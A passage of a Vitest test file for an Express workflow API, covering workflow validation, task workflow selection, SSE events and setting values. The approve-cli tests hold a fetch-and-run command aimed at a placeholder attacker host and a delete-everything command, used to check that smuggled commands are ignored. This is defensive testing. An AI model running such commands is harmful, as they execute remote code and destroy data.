// @vitest-environment node

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import express from "express";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TaskStore, isBuiltinWorkflowId } from "@fusion/core";
import type { WorkflowIr } from "@fusion/core";
import { registerWorkflowRoutes } from "../routes/register-workflow-routes.js";
import { ApiError, sendErrorResponse } from "../api-error.js";
import { request } from "../test-request.js";
import { emitWorkflowSseEvent } from "../sse.js";

vi.mock("../sse.js", () => ({
  emitWorkflowSseEvent: vi.fn(),
}));

function linearIr(): WorkflowIr {
  return {
    version: "v1",
    name: "wf",
    nodes: [
      { id: "start", kind: "start" },
      { id: "lint", kind: "gate", config: { name: "Lint", scriptName: "lint" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "lint", condition: "success" },
      { from: "lint", to: "end", condition: "success" },
    ],
  };
}

function branchingIr(): WorkflowIr {
  return {
    version: "v1",
    name: "branchy",
    nodes: [
      { id: "start", kind: "start" },
      { id: "a", kind: "prompt", config: { prompt: "a" } },
      { id: "b", kind: "prompt", config: { prompt: "b" } },
      { id: "end", kind: "end" },
    ],
    edges: [
      { from: "start", to: "a", condition: "success" },
      { from: "a", to: "b", condition: "success" },
      { from: "a", to: "end", condition: "success" },
      { from: "b", to: "end", condition: "success" },
    ],
  };
}

describe("workflow routes (U4)", () => {
  let store: TaskStore;
  let rootDir: string;
  let globalDir: string;
  let app: express.Express;

  beforeEach(async () => {
    rootDir = mkdtempSync(join(tmpdir(), "wf-routes-root-"));
    globalDir = mkdtempSync(join(tmpdir(), "wf-routes-global-"));
    store = new TaskStore(rootDir, globalDir, { inMemoryDb: true });
    await store.init();

    app = express();
    app.use(express.json());
    const router = express.Router();
    registerWorkflowRoutes({
      router,
      getProjectContext: async () => ({ store, engine: undefined, projectId: "proj-workflow-routes" }),
      rethrowAsApiError: (err: unknown) => {
        throw err instanceof ApiError ? err : new ApiError(500, err instanceof Error ? err.message : String(err));
      },
    } as unknown as Parameters<typeof registerWorkflowRoutes>[0]);
    app.use("/api", router);
    app.use((err: unknown, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
      if (err instanceof ApiError) sendErrorResponse(res, err.statusCode, err.message, { details: err.details });
      else sendErrorResponse(res, 500, err instanceof Error ? err.message : String(err));
    });
  });

  afterEach(() => {
    store.close();
    rmSync(rootDir, { recursive: true, force: true });
    rmSync(globalDir, { recursive: true, force: true });
    vi.mocked(emitWorkflowSseEvent).mockClear();
  });

  const post = (path: string, body: unknown) =>
    request(app, "POST", path, JSON.stringify(body), { "content-type": "application/json" });
  const put = (path: string, body: unknown) =>
    request(app, "PUT", path, JSON.stringify(body), { "content-type": "application/json" });
  const get = (path: string) => request(app, "GET", path);
  const patch = (path: string, body: unknown) =>
    request(app, "PATCH", path, JSON.stringify(body), { "content-type": "application/json" });

  it("POST /workflows creates with valid IR and rejects malformed IR", async () => {
    const ok = await post("/api/workflows", { name: "QA", ir: linearIr() });
    expect(ok.status).toBe(201);
    expect((ok.body as { id: string }).id).toBe("WF-001");

    const bad = await post("/api/workflows", { name: "Bad", ir: { version: "v1", name: "x", nodes: [], edges: [] } });
    expect(bad.status).toBe(400);
  });

  it("Residual A: POST /workflows rejects a server-side trait composition conflict with 400 + violations", async () => {
    // A v2 column carrying BOTH `complete` and `wip` (countsTowardWip) — a
    // terminal column cannot also hold a capacity slot. parseWorkflowIr accepts
    // the shape; the save-mode composition validator must reject it.
    const conflictIr: WorkflowIr = {
      version: "v2",
      name: "conflict",
      columns: [
        { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
        { id: "bad-col", name: "Bad", traits: [{ trait: "complete" }, { trait: "wip", config: { limit: 1 } }] },
      ],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "end", kind: "end", column: "bad-col" },
      ],
      edges: [{ from: "start", to: "end" }],
    } as WorkflowIr;
    const res = await post("/api/workflows", { name: "Conflict", ir: conflictIr });
    expect(res.status).toBe(400);
    const details = (res.body as { details?: { violations?: unknown[] } }).details;
    expect(Array.isArray(details?.violations)).toBe(true);
    expect((details?.violations?.length ?? 0)).toBeGreaterThan(0);
  });

  it("Residual A: PATCH /workflows/:id rejects a trait composition conflict server-side", async () => {
    const created = await post("/api/workflows", {
      name: "Editable",
      ir: {
        version: "v2",
        name: "editable",
        columns: [
          { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
          { id: "work-col", name: "Work", traits: [] },
        ],
        nodes: [
          { id: "start", kind: "start", column: "intake-col" },
          { id: "end", kind: "end", column: "work-col" },
        ],
        edges: [{ from: "start", to: "end" }],
      },
    });
    expect(created.status).toBe(201);
    const id = (created.body as { id: string }).id;
    const conflictIr: WorkflowIr = {
      version: "v2",
      name: "editable",
      columns: [
        { id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] },
        { id: "work-col", name: "Work", traits: [{ trait: "complete" }, { trait: "wip", config: { limit: 2 } }] },
      ],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "end", kind: "end", column: "work-col" },
      ],
      edges: [{ from: "start", to: "end" }],
    } as WorkflowIr;
    const res = await request(app, "PATCH", `/api/workflows/${id}`, JSON.stringify({ ir: conflictIr }), {
      "content-type": "application/json",
    });
    expect(res.status).toBe(400);
  });

  // ── Handoff (KTD-15): save-time code-node compile validation ────────────────
  /** A v2 IR with a single `code` node whose `source` core accepts (non-empty,
   *  under the size cap) but which esbuild may or may not compile. */
  function codeNodeIr(source: string): WorkflowIr {
    return {
      version: "v2",
      name: "code-wf",
      columns: [{ id: "intake-col", name: "Intake", traits: [{ trait: "intake" }] }],
      nodes: [
        { id: "start", kind: "start", column: "intake-col" },
        { id: "calc", kind: "code", column: "intake-col", config: { source } },
        { id: "end", kind: "end", column: "intake-col" },
      ],
      edges: [
        { from: "start", to: "calc", condition: "success" },
        { from: "calc", to: "end", condition: "success" },
      ],
    } as WorkflowIr;
  }

  it("POST /workflows rejects an uncompilable code node with 400 + per-node errors", async () => {
    // Valid TS (compiles) is accepted.
    const ok = await post("/api/workflows", {
      name: "GoodCode",
      ir: codeNodeIr("export default async (ctx) => ({ outcome: 'success' });"),
    });
    expect(ok.status).toBe(201);

    // A syntax error passes core's non-empty source check but fails esbuild.
    const bad = await post("/api/workflows", {
      name: "BadCode",
      ir: codeNodeIr("export default async (ctx) => { return ((( }"),
    });
    expect(bad.status).toBe(400);
    const details = (bad.body as { details?: { codeNodeErrors?: Array<{ nodeId: string; error: string }> } }).details;
    expect(Array.isArray(details?.codeNodeErrors)).toBe(true);
    expect(details?.codeNodeErrors?.some((e) => e.nodeId === "calc")).toBe(true);
  });

  it("PATCH /workflows/:id rejects an uncompilable code node with 400", async () => {
    const created = await post("/api/workflows", {
      name: "EditableCode",
      ir: codeNodeIr("export default async (ctx) => ({});"),
    });
    expect(created.status).toBe(201);
    const id = (created.body as { id: string }).id;

    const res = await request(
      app,
      "PATCH",
      `/api/workflows/${id}`,
      JSON.stringify({ ir: codeNodeIr("export default async (ctx) => { return ((( }") }),
      { "content-type": "application/json" },
    );
    expect(res.status).toBe(400);
    const details = (res.body as { details?: { codeNodeErrors?: unknown[] } }).details;
    expect((details?.codeNodeErrors?.length ?? 0)).toBeGreaterThan(0);
  });

  it("GET /workflows lists created workflows (ahead of read-only built-ins)", async () => {
    await post("/api/workflows", { name: "A", ir: linearIr() });
    const res = await get("/api/workflows");
    expect(res.status).toBe(200);
    const list = res.body as Array<{ id: string }>;
    // The list prepends read-only built-ins; exactly one user workflow exists.
    const userWorkflows = list.filter((w) => !isBuiltinWorkflowId(w.id));
    expect(userWorkflows.length).toBe(1);
    expect(list.some((w) => isBuiltinWorkflowId(w.id))).toBe(true);
  });

  it("GET /workflows/:id/optional-steps resolves declared optional steps", async () => {
    const builtin = await get("/api/workflows/builtin%3Acoding/optional-steps");
    expect(builtin.status).toBe(200);
    expect(builtin.body).toEqual([
      expect.objectContaining({
        templateId: "browser-verification",
        name: "Browser Verification",
        icon: "globe",
        defaultOn: false,
      }),
    ]);

    const custom = await post("/api/workflows", { name: "A", ir: linearIr() });
    const customId = (custom.body as { id: string }).id;
    const customSteps = await get(`/api/workflows/${customId}/optional-steps`);
    expect(customSteps.status).toBe(200);
    expect(customSteps.body).toEqual([]);

    const missing = await get("/api/workflows/WF-404/optional-steps");
    expect(missing.status).toBe(404);
  });

  it("GET /traits returns the registry trait catalog (built-ins, with flags + schema)", async () => {
    const res = await get("/api/traits");
    expect(res.status).toBe(200);
    const { traits } = res.body as {
      traits: Array<{ id: string; name: string; builtin: boolean; flags: Record<string, boolean>; configSchema?: unknown }>;
    };
    // The 14 built-in traits are registered on import.
    expect(traits.length).toBeGreaterThanOrEqual(14);
    const intake = traits.find((t) => t.id === "intake");
    expect(intake?.builtin).toBe(true);
    expect(intake?.flags.intake).toBe(true);
    const wip = traits.find((t) => t.id === "wip");
    expect(wip?.configSchema).toBeTruthy();
    const complete = traits.find((t) => t.id === "complete");
    expect(complete?.flags.complete).toBe(true);
  });

  it("POST /workflows/:id/compile returns steps for linear and 422 for branching", async () => {
    const linear = await post("/api/workflows", { name: "L", ir: linearIr() });
    const linearId = (linear.body as { id: string }).id;
    const okCompile = await post(`/api/workflows/${linearId}/compile`, {});
    expect(okCompile.status).toBe(200);
    expect((okCompile.body as { steps: unknown[] }).steps).toHaveLength(1);

    const branchy = await post("/api/workflows", { name: "B", ir: branchingIr() });
    const branchyId = (branchy.body as { id: string }).id;
    const badCompile = await post(`/api/workflows/${branchyId}/compile`, {});
    expect(badCompile.status).toBe(422);
    expect((badCompile.body as { error: string }).error).toMatch(/interpreter \(deferred\)/i);
  });

  /*
  FNXC:CustomWorkflows 2026-06-18-11:03:
  FN-6645 locks the per-task workflow selection route contract: missing or non-string workflowId returns 400, unknown ids return 404, uncompilable custom IR returns 422, explicit null clears, and workflow:updated SSE is emitted only after successful select or clear mutations.
  */
  it("PUT /tasks/:taskId/workflow selects and reflects on the task", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });

    const sel = await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    expect(sel.status).toBe(200);
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);

    const read = await get(`/api/tasks/${task.id}/workflow`);
    expect((read.body as { workflowId: string }).workflowId).toBe(wfId);
  });

  it("PUT /tasks/:taskId/workflow rejects an omitted workflowId but clears on explicit null", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    vi.mocked(emitWorkflowSseEvent).mockClear();

    // Malformed body ({}) must not silently wipe the selection or emit SSE.
    const omitted = await put(`/api/tasks/${task.id}/workflow`, {});
    expect(omitted.status).toBe(400);
    expect(emitWorkflowSseEvent).not.toHaveBeenCalled();
    const stillSelected = await get(`/api/tasks/${task.id}/workflow`);
    expect((stillSelected.body as { workflowId: string }).workflowId).toBe(wfId);

    // Explicit null is the only clear signal.
    const cleared = await put(`/api/tasks/${task.id}/workflow`, { workflowId: null });
    expect(cleared.status).toBe(200);
    expect((cleared.body as { workflowId: string | null }).workflowId).toBeNull();
    const read = await get(`/api/tasks/${task.id}/workflow`);
    expect((read.body as { workflowId: string | null }).workflowId).toBeNull();
  });

  it.each([123, true, {}, []])(
    "PUT /tasks/:taskId/workflow rejects non-string workflowId %j with 400 and no SSE",
    async (workflowId) => {
      const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
      const wfId = (wf.body as { id: string }).id;
      const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
      await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
      vi.mocked(emitWorkflowSseEvent).mockClear();

      const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId });
      expect(res.status).toBe(400);
      expect(emitWorkflowSseEvent).not.toHaveBeenCalled();
      const stillSelected = await get(`/api/tasks/${task.id}/workflow`);
      expect((stillSelected.body as { workflowId: string }).workflowId).toBe(wfId);
    },
  );

  it("PUT /tasks/:taskId/workflow maps uncompilable custom workflow IR to 422 without SSE", async () => {
    const branchy = await post("/api/workflows", { name: "Branching", ir: branchingIr() });
    const branchyId = (branchy.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    vi.mocked(emitWorkflowSseEvent).mockClear();

    const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId: branchyId });
    expect(res.status).toBe(422);
    expect(emitWorkflowSseEvent).not.toHaveBeenCalled();
  });

  it("PUT /tasks/:taskId/workflow emits workflow:updated exactly once after select and clear", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    vi.mocked(emitWorkflowSseEvent).mockClear();

    const selected = await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    expect(selected.status).toBe(200);
    expect(emitWorkflowSseEvent).toHaveBeenCalledTimes(1);
    expect(emitWorkflowSseEvent).toHaveBeenCalledWith(
      "workflow:updated",
      { taskId: task.id, workflowId: wfId },
      "proj-workflow-routes",
    );

    vi.mocked(emitWorkflowSseEvent).mockClear();
    const cleared = await put(`/api/tasks/${task.id}/workflow`, { workflowId: null });
    expect(cleared.status).toBe(200);
    expect(emitWorkflowSseEvent).toHaveBeenCalledTimes(1);
    expect(emitWorkflowSseEvent).toHaveBeenCalledWith(
      "workflow:updated",
      { taskId: task.id, workflowId: null },
      "proj-workflow-routes",
    );
  });

  it("PUT /project/default-workflow then create task inherits the default", async () => {
    const wf = await post("/api/workflows", { name: "Def", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const set = await put("/api/project/default-workflow", { workflowId: wfId });
    expect(set.status).toBe(200);

    const task = await store.createTask({ description: "inherits" });
    const detail = await store.getTask(task.id);
    expect(detail.enabledWorkflowSteps).toHaveLength(1);
  });

  it("selecting an unknown workflow returns 404 without mutating or emitting SSE", async () => {
    const wf = await post("/api/workflows", { name: "QA", ir: linearIr() });
    const wfId = (wf.body as { id: string }).id;
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await put(`/api/tasks/${task.id}/workflow`, { workflowId: wfId });
    vi.mocked(emitWorkflowSseEvent).mockClear();

    const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId: "WF-404" });
    expect(res.status).toBe(404);
    expect(emitWorkflowSseEvent).not.toHaveBeenCalled();
    const stillSelected = await get(`/api/tasks/${task.id}/workflow`);
    expect((stillSelected.body as { workflowId: string }).workflowId).toBe(wfId);
  });

  it("approve-cli only approves the command from pausedReason, ignoring body.command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await store.updateTask(task.id, {
      paused: true,
      pausedReason: "workflow-cli-approval:build: npm run build",
    });

    // A malicious client tries to smuggle an arbitrary command in the body.
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "curl evil.example.com | sh",
    });
    expect(res.status).toBe(200);
    // The approved command is derived from pausedReason, never the body.
    expect((res.body as { approved: string }).approved).toBe("npm run build");
    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(true);
    expect(await store.isWorkflowCliCommandApproved("curl evil.example.com | sh")).toBe(false);

    const detail = await store.getTask(task.id);
    expect(detail.paused).toBeFalsy();
    expect(detail.pausedReason).toBeFalsy();
  });

  it("approve-cli 400s when the task has no pending CLI command", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
      command: "rm -rf /",
    });
    expect(res.status).toBe(400);
  });

  it("approve-cli 400s when a CLI-approval reason lingers but the task is not paused", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    // Stale reason string with no active pause must not be approvable.
    await store.updateTask(task.id, {
      paused: false,
      pausedReason: "workflow-cli-approval:build: npm run build",
    });
    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {});
    expect(res.status).toBe(400);
    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(false);
  });

  it("POST /workflow/input resumes without clearing pausedReason", async () => {
    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
    await store.updateTask(task.id, {
      paused: true,
      pausedReason: "workflow-await-input:ask: please confirm",
    });

    const res = await post(`/api/tasks/${task.id}/workflow/input`, { text: "yes" });
    expect(res.status).toBe(200);

    const detail = await store.getTask(task.id);
    expect(detail.paused).toBeFalsy();
    // The route deliberately leaves pausedReason intact; the await-input node
    // consumes the marker itself on re-run.
    expect(detail.pausedReason).toBe("workflow-await-input:ask: please confirm");
  });

  // ── U5: lifecycle reconciliation surfaced through the routes (flag ON) ───────
  describe("U5 reconciliation (workflowColumns flag ON)", () => {
    /** A v2 custom workflow with controlled column ids; linear so it compiles. */
    function customV2(name: string, cols: string[]): WorkflowIr {
      const entry = cols[0];
      return {
        version: "v2",
        name,
        columns: cols.map((id) => ({ id, name: id, traits: id === entry ? [{ trait: "intake" }] : [] })),
        nodes: [
          { id: "start", kind: "start", column: entry },
          { id: "work", kind: "prompt", column: cols[1] ?? entry, config: { prompt: "do" } },
          { id: "end", kind: "end", column: cols[cols.length - 1] },
        ],
        edges: [
          { from: "start", to: "work", condition: "success" },
          { from: "work", to: "end", condition: "success" },
        ],
      };
    }

    beforeEach(async () => {
      await store.updateGlobalSettings({ experimentalFeatures: { workflowColumns: true } });
    });

    it("PATCH removing an occupied column 409s with per-column occupant counts", async () => {
      const wf = await post("/api/workflows", { name: "edit", ir: customV2("edit", ["intake", "build", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "occ" });
      await store.selectTaskWorkflowAndReconcile(t.id, wfId);
      await store.moveTask(t.id, "build", { moveSource: "user" });

      const res = await request(
        app,
        "PATCH",
        `/api/workflows/${wfId}`,
        JSON.stringify({ ir: customV2("edit", ["intake", "done"]) }),
        { "content-type": "application/json" },
      );
      expect(res.status).toBe(409);
      const details = (res.body as { details?: { occupancies?: Array<{ columnId: string; count: number }> } }).details;
      expect(details?.occupancies).toEqual([{ columnId: "build", count: 1 }]);
    });

    it("PATCH with rehomeTo saves and re-homes occupants", async () => {
      const wf = await post("/api/workflows", { name: "rehome", ir: customV2("rehome", ["intake", "build", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "occ" });
      await store.selectTaskWorkflowAndReconcile(t.id, wfId);
      await store.moveTask(t.id, "build", { moveSource: "user" });

      const res = await request(
        app,
        "PATCH",
        `/api/workflows/${wfId}`,
        JSON.stringify({ ir: customV2("rehome", ["intake", "done"]), rehomeTo: "intake" }),
        { "content-type": "application/json" },
      );
      expect(res.status).toBe(200);
      expect((await store.getTask(t.id)).column).toBe("intake");
    });

    it("PUT selection re-homes the card and returns the reconciliation outcome", async () => {
      const wf = await post("/api/workflows", { name: "sw", ir: customV2("sw", ["intake", "doing", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "switcher" });
      await store.moveTask(t.id, "todo", { moveSource: "user" });

      const res = await put(`/api/tasks/${t.id}/workflow`, { workflowId: wfId });
      expect(res.status).toBe(200);
      const recon = (res.body as { reconciliation?: { preserved: boolean; toColumn: string } }).reconciliation;
      expect(recon?.preserved).toBe(false);
      expect(recon?.toColumn).toBe("intake");
      expect((await store.getTask(t.id)).column).toBe("intake");
    });

    it("PUT selection emits workflow invalidation SSE after a re-home", async () => {
      const wf = await post("/api/workflows", { name: "emit-rehome", ir: customV2("emit-rehome", ["intake", "doing", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "switcher" });
      await store.moveTask(t.id, "todo", { moveSource: "user" });
      vi.mocked(emitWorkflowSseEvent).mockClear();

      const res = await put(`/api/tasks/${t.id}/workflow`, { workflowId: wfId });

      expect(res.status).toBe(200);
      expect(emitWorkflowSseEvent).toHaveBeenCalledTimes(1);
      expect(emitWorkflowSseEvent).toHaveBeenCalledWith(
        "workflow:updated",
        { taskId: t.id, workflowId: wfId },
        "proj-workflow-routes",
      );
    });

    it("PUT selection emits workflow invalidation SSE when the current column is preserved", async () => {
      const wf = await post("/api/workflows", { name: "emit-preserved", ir: customV2("emit-preserved", ["intake", "todo", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "preserved switcher" });
      await store.moveTask(t.id, "todo", { moveSource: "user" });
      vi.mocked(emitWorkflowSseEvent).mockClear();

      const res = await put(`/api/tasks/${t.id}/workflow`, { workflowId: wfId });

      expect(res.status).toBe(200);
      expect((res.body as { reconciliation?: { preserved: boolean } }).reconciliation?.preserved).toBe(true);
      expect(emitWorkflowSseEvent).toHaveBeenCalledTimes(1);
      expect(emitWorkflowSseEvent).toHaveBeenCalledWith(
        "workflow:updated",
        { taskId: t.id, workflowId: wfId },
        "proj-workflow-routes",
      );
    });

    it("PUT clear emits workflow invalidation SSE with a null workflow id", async () => {
      const wf = await post("/api/workflows", { name: "emit-clear", ir: customV2("emit-clear", ["intake", "doing", "done"]) });
      const wfId = (wf.body as { id: string }).id;
      const t = await store.createTask({ description: "clear switcher" });
      await store.selectTaskWorkflowAndReconcile(t.id, wfId);
      vi.mocked(emitWorkflowSseEvent).mockClear();

      const res = await put(`/api/tasks/${t.id}/workflow`, { workflowId: null });

      expect(res.status).toBe(200);
      expect(emitWorkflowSseEvent).toHaveBeenCalledTimes(1);
      expect(emitWorkflowSseEvent).toHaveBeenCalledWith(
        "workflow:updated",
        { taskId: t.id, workflowId: null },
        "proj-workflow-routes",
      );
    });

    it("PUT selection validation errors do not emit workflow invalidation SSE", async () => {
      const t = await store.createTask({ description: "invalid switcher" });

      const missing = await put(`/api/tasks/${t.id}/workflow`, {});
      const invalid = await put(`/api/tasks/${t.id}/workflow`, { workflowId: 42 });

      expect(missing.status).toBe(400);
      expect(invalid.status).toBe(400);
      expect(emitWorkflowSseEvent).not.toHaveBeenCalled();
    });
  });

  // ── Workflow setting VALUES (U6, R5) ───────────────────────────────────────
  describe("setting-values routes (U6)", () => {
    // A v2 IR declaring one of each value-relevant type.
    function settingsIr(name: string): WorkflowIr {
      return {
        version: "v2",
        name,
        columns: [],
        nodes: [
          { id: "start", kind: "start" },
          { id: "end", kind: "end" },
        ],
        edges: [{ from: "start", to: "end", condition: "success" }],
        settings: [
          { id: "timeout-ms", name: "Timeout", type: "number", default: 1000 },
          { id: "new-sessions", name: "New sessions", type: "boolean", default: false },
          {
            id: "review-policy",
            name: "Review policy",
            type: "enum",
            default: "strict",
            options: [
              { value: "strict", label: "Strict" },
              { value: "lenient", label: "Lenient" },
            ],
          },
          { id: "label", name: "Label", type: "string" },
        ],
      } as WorkflowIr;
    }

    async function createSettingsWorkflow(): Promise<string> {
      const wf = await post("/api/workflows", { name: "sw-settings", ir: settingsIr("sw-settings") });
      expect(wf.status).toBe(201);
      return (wf.body as { id: string }).id;
    }

    it("GET returns stored/effective/orphaned (defaults until a value is stored)", async () => {
      const id = await createSettingsWorkflow();
      const res = await get(`/api/workflows/${encodeURIComponent(id)}/setting-values`);
      expect(res.status).toBe(200);
      const body = res.body as {
        stored: Record<string, unknown>;
        effective: Record<string, unknown>;
        orphaned: Array<{ id: string }>;
      };
      expect(body.stored).toEqual({});
      // Declaration defaults fill the effective map (drop-on-orphan, KTD-6).
      expect(body.effective["timeout-ms"]).toBe(1000);
      expect(body.effective["new-sessions"]).toBe(false);
      expect(body.effective["review-policy"]).toBe("strict");
      expect(body.orphaned).toEqual([]);
    });

    it("PATCH writes a valid batch (one request, multiple keys) and reflects it", async () => {
      const id = await createSettingsWorkflow();
      const res = await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, {
        values: { "timeout-ms": 5000, "new-sessions": true, "review-policy": "lenient" },
      });
      expect(res.status).toBe(200);
      const body = res.body as { stored: Record<string, unknown>; effective: Record<string, unknown> };
      expect(body.stored).toEqual({ "timeout-ms": 5000, "new-sessions": true, "review-policy": "lenient" });
      expect(body.effective["timeout-ms"]).toBe(5000);
      expect(body.effective["label"]).toBeUndefined(); // no default, no stored
    });

    it("PATCH null deletes a key (clear-to-default)", async () => {
      const id = await createSettingsWorkflow();
      await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, { values: { "timeout-ms": 5000 } });
      const res = await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, {
        values: { "timeout-ms": null },
      });
      expect(res.status).toBe(200);
      const body = res.body as { stored: Record<string, unknown>; effective: Record<string, unknown> };
      expect(body.stored["timeout-ms"]).toBeUndefined();
      expect(body.effective["timeout-ms"]).toBe(1000); // back to declaration default
    });

    it("PATCH rejects an invalid value with 400 + typed rejections; nothing persisted", async () => {
      const id = await createSettingsWorkflow();
      const res = await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, {
        values: { "timeout-ms": "not-a-number", "review-policy": "bogus" },
      });
      expect(res.status).toBe(400);
      const details = (res.body as { details?: { rejections?: Array<{ settingId: string; code: string }> } }).details;
      const rejections = details?.rejections ?? [];
      const byId = Object.fromEntries(rejections.map((r) => [r.settingId, r.code]));
      expect(byId["timeout-ms"]).toBe("type-mismatch");
      expect(byId["review-policy"]).toBe("enum-violation");
      // Write-boundary contract: nothing persisted.
      const after = await get(`/api/workflows/${encodeURIComponent(id)}/setting-values`);
      expect((after.body as { stored: Record<string, unknown> }).stored).toEqual({});
    });

    it("PATCH accepts a value write for a built-in workflow (R4)", async () => {
      const res = await patch("/api/workflows/builtin:coding/setting-values", {
        values: { workflowStepTimeoutMs: 123_456 },
      });
      // Built-in coding declares the moved-key catalog; a valid numeric write
      // succeeds even though built-in DECLARATIONS are not editable.
      expect(res.status).toBe(200);
      const body = res.body as { stored: Record<string, unknown> };
      expect(body.stored["workflowStepTimeoutMs"]).toBe(123_456);
    });

    it("GET surfaces orphaned stored values after a declaration retype", async () => {
      const id = await createSettingsWorkflow();
      // Store a valid number for timeout-ms.
      await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, { values: { "timeout-ms": 5000 } });
      // Retype timeout-ms to a string via an IR save → the stored number orphans.
      const retyped = settingsIr("sw-settings");
      (retyped as { settings?: Array<{ id: string; type: string; default?: unknown }> }).settings![0] = {
        id: "timeout-ms",
        name: "Timeout",
        type: "string",
      } as never;
      await patch(`/api/workflows/${encodeURIComponent(id)}`, { ir: retyped });
      const res = await get(`/api/workflows/${encodeURIComponent(id)}/setting-values`);
      expect(res.status).toBe(200);
      const body = res.body as { effective: Record<string, unknown>; orphaned: Array<{ id: string; value: unknown }> };
      expect(body.orphaned.some((o) => o.id === "timeout-ms" && o.value === 5000)).toBe(true);
      // Effective drops the orphan (no string default declared) → undefined.
      expect(body.effective["timeout-ms"]).toBeUndefined();
    });

    it("PATCH 400 when values is missing/not an object", async () => {
      const id = await createSettingsWorkflow();
      const res = await patch(`/api/workflows/${encodeURIComponent(id)}/setting-values`, { values: [1, 2, 3] });
      expect(res.status).toBe(400);
    });

    it("GET returns 404 for an unknown workflow id (neither built-in nor custom)", async () => {
      const res = await get("/api/workflows/WF-404/setting-values");
      expect(res.status).toBe(404);
    });

    it("PATCH returns 404 for an unknown workflow id (neither built-in nor custom)", async () => {
      const res = await patch("/api/workflows/WF-404/setting-values", {
        values: { "timeout-ms": 5000 },
      });
      expect(res.status).toBe(404);
    });
  });
});

// ── U6: write-time column-agent validation (existence + policy escalation) ────

describe("workflow routes — column agents (U6)", () => {
  let store: TaskStore;
  let rootDir: string;
  let globalDir: string;
  let app: express.Express;

  /** A v2 workflow whose `triage` column optionally binds an agent. */
  function boundIr(agent?: { agentId: string; mode: "defer" | "override" }): WorkflowIr {
    return {
      version: "v2",
      name: "bound",
      columns: [
        { id: "triage", name: "Triage", traits: [{ trait: "intake" }], ...(agent ? { agent } : {}) },
        { id: "done", name: "Done", traits: [{ trait: "complete" }] },
      ],
      nodes: [
        { id: "start", kind: "start", column: "triage" },
        { id: "work", kind: "prompt", column: "triage", config: { prompt: "do" } },
        { id: "end", kind: "end", column: "done" },
      ],
      edges: [
        { from: "start", to: "work", condition: "success" },
        { from: "work", to: "end", condition: "success" },
      ],
    } as WorkflowIr;
  }

  async function makeAgent(input: { permissionPolicy?: { presetId: "unrestricted" | "approval-required" | "locked-down" | "custom"; rules?: Record<string, string> } }): Promise<string> {
    const { AgentStore } = await import("@fusion/core");
    const agentStore = new AgentStore({ rootDir: store.getFusionDir() });
    await agentStore.init();
    const agent = await agentStore.createAgent({
      name: `Agent ${Math.random().toString(36).slice(2, 8)}`,
      role: "executor",
      permissionPolicy: input.permissionPolicy as never,
    });
    return agent.id;
  }

  beforeEach(async () => {
    rootDir = mkdtempSync(join(tmpdir(), "wf-ca-root-"));
    globalDir = mkdtempSync(join(tmpdir(), "wf-ca-global-"));
    store = new TaskStore(rootDir, globalDir, { inMemoryDb: true });
    await store.init();

    app = express();
    app.use(express.json());
    const router = express.Router();
    registerWorkflowRoutes({
      router,
      getProjectContext: async () => ({ store, engine: undefined, projectId: undefined }),
      rethrowAsApiError: (err: unknown) => {
        throw err instanceof ApiError ? err : new ApiError(500, err instanceof Error ? err.message : String(err));
      },
    } as unknown as Parameters<typeof registerWorkflowRoutes>[0]);
    app.use("/api", router);
    app.use((err: unknown, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
      if (err instanceof ApiError) sendErrorResponse(res, err.statusCode, err.message, { details: err.details });
      else sendErrorResponse(res, 500, err instanceof Error ? err.message : String(err));
